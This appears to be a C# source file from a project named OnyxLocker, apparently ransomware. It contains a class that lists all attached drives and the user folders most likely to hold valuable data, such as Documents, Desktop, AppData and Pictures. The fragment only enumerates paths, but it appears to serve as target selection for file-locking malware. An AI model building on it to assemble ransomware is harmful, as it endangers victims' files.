using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace OnyxLocker.Classes
{
    internal class FolderBrowser : IDriveExplorer
    {
        /// <summary>
        /// Gets all the attached drives
        /// </summary>
        /// <returns></returns>
        public List<string> GetStartingFolders()
        {
            var connectedDrives = DriveInfo.GetDrives().Select(drive => drive.Name).ToList();
            connectedDrives.AddRange(GetSpecialFolders());

            return connectedDrives;
        }

        /// <summary>
        /// Gets the few "special" folders which probably contain important user data
        /// </summary>
        /// <returns></returns>
        private List<string> GetSpecialFolders()
        {
            return new List<string>()
            {
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            };
        }
    }
}